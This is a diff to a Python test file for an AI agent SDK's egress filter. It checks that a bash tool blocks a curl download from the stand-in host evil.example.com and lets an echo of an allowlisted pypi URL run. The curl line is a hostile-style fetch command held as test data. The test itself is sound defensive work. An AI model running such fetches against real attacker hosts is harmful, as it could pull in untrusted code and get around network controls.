@@ -191,22 +191,36 @@ def _wait_ask(events):
     raise AssertionError("no await_permission emitted")
 
 
+def _kernel_local_host():
+    """The SDK host with a host_call that must never fire — host.bash is
+    kernel-local (the host executes only python/R cells; shell runs in the
+    worker process, where this test stands in for the worker)."""
+    from openai4s.sdk.host import build_host
+
+    def _no_rpc(method, args):
+        raise AssertionError(f"host.bash must not RPC to the host: {method}")
+
+    return build_host(_no_rpc)
+
+
 def test_bash_blocked_domain_soft_fails_before_running(tmp_path, monkeypatch):
     _allowlist(monkeypatch)
-    disp, _frame, _ = _dispatcher(tmp_path)  # headless → gate degrades to allow
-    r = disp("bash", [{"command": "curl -s https://evil.example.com/x > out.txt"}])
-    assert set(r.keys()) == {"error"}
-    # the soft-fail error is exactly the shared blocked-message (names the host)
-    assert r["error"] == egress.blocked_message("evil.example.com")
+    monkeypatch.chdir(tmp_path)
+    host = _kernel_local_host()
+    with pytest.raises(RuntimeError) as ei:
+        host.bash("curl -s https://evil.example.com/x > out.txt")
+    # the error is exactly the shared blocked-message (names the host)
+    assert str(ei.value) == egress.blocked_message("evil.example.com")
     # the command never ran, so it wrote nothing
-    assert not (disp._workspace() / "out.txt").exists()
+    assert not (tmp_path / "out.txt").exists()
 
 
 def test_bash_allowlisted_domain_is_not_fenced(tmp_path, monkeypatch):
     _allowlist(monkeypatch)
-    disp, _frame, _ = _dispatcher(tmp_path)
+    monkeypatch.chdir(tmp_path)
+    host = _kernel_local_host()
     # echo of an allowlisted URL passes the egress scan and runs (no network)
-    r = disp("bash", [{"command": "echo fetching https://pypi.org/simple/ done"}])
+    r = host.bash("echo fetching https://pypi.org/simple/ done")
     assert "done" in (r.get("stdout") or "")
     assert r.get("exit_code") == 0
 
